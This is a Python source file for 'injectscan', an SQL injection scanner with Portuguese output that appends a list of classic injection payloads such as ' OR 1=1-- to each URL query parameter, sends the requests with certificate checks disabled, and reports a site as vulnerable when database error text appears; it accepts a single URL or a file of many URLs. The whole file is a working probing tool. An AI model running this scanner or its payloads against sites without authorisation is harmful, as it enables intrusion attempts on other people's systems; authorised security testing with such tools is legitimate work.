
#!/usr/bin/env python3
# Tool: injectscan by GNU23
# SQL Injection Vulnerability Scanner

import argparse
import requests
import urllib3
from colorama import Fore, Style, init
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

# Desativa warnings SSL
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

init(autoreset=True)

BANNER = f"""{Fore.MAGENTA}
 ██████╗ ███╗   ██╗██╗   ██╗██████╗ ██╗  ██╗ ██████╗ ███████╗ █████╗ ███╗   ██╗
██╔═══██╗████╗  ██║██║   ██║██╔══██╗██║  ██║██╔════╝ ██╔════╝██╔══██╗████╗  ██║
██║   ██║██╔██╗ ██║██║   ██║██║  ██║███████║██║  ███╗█████╗  ███████║██╔██╗ ██║
██║   ██║██║╚██╗██║██║   ██║██║  ██║██╔══██║██║   ██║██╔══╝  ██╔══██║██║╚██╗██║
╚██████╔╝██║ ╚████║╚██████╔╝██████╔╝██║  ██║╚██████╔╝███████╗██║  ██║██║ ╚████║
 ╚═════╝ ╚═╝  ╚═══╝ ╚═════╝ ╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝╚═╝  ╚═══╝
               {Fore.CYAN}G N U 2 3   |   i n j e c t s c a n   v1.0
{Style.RESET_ALL}"""

PAYLOADS = ["'", "'--", "' OR 1=1--", "' OR '1'='1", '" OR "1"="1', "' OR 1=1#", "') OR ('1'='1"]

def scan_url(url):
    print(f"🔎 {Fore.YELLOW}Testando:{Style.RESET_ALL} {url}")
    parsed = urlparse(url)
    qs = parse_qs(parsed.query)

    if not qs:
        print(f"{Fore.RED}[x] Nenhum parâmetro detectado na URL.{Style.RESET_ALL}")
        return

    vulnerable = False
    for param in qs:
        original = qs[param][0]
        for payload in PAYLOADS:
            qs[param][0] = original + payload
            new_query = urlencode(qs, doseq=True)
            new_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path, '', new_query, ''))

            try:
                r = requests.get(new_url, timeout=10, verify=False)
                if any(err in r.text.lower() for err in ["sql syntax", "mysql", "syntax error", "unclosed quotation", "sqlite"]):
                    print(f"{Fore.RED}[!] Vulnerável! → {new_url}{Style.RESET_ALL}")
                    vulnerable = True
                    break
            except Exception as e:
                print(f"{Fore.RED}[!] Erro em: {new_url} -> {e}{Style.RESET_ALL}")
        qs[param][0] = original

    if not vulnerable:
        print(f"{Fore.GREEN}[✓] Nenhuma vulnerabilidade detectada.{Style.RESET_ALL}")

def main():
    print(BANNER)
    parser = argparse.ArgumentParser(description="Scanner de SQLi - GNU23")
    parser.add_argument('-u', '--url', help="URL para escanear")
    parser.add_argument('-l', '--list', help="Arquivo com lista de URLs")
    args = parser.parse_args()

    if not args.url and not args.list:
        parser.print_help()
        return

    if args.url:
        scan_url(args.url)
    elif args.list:
        try:
            with open(args.list, 'r') as f:
                for line in f:
                    line = line.strip()
                    if line:
                        scan_url(line)
        except FileNotFoundError:
            print(f"{Fore.RED}[x] Arquivo não encontrado.{Style.RESET_ALL}")

if __name__ == '__main__':
    main()
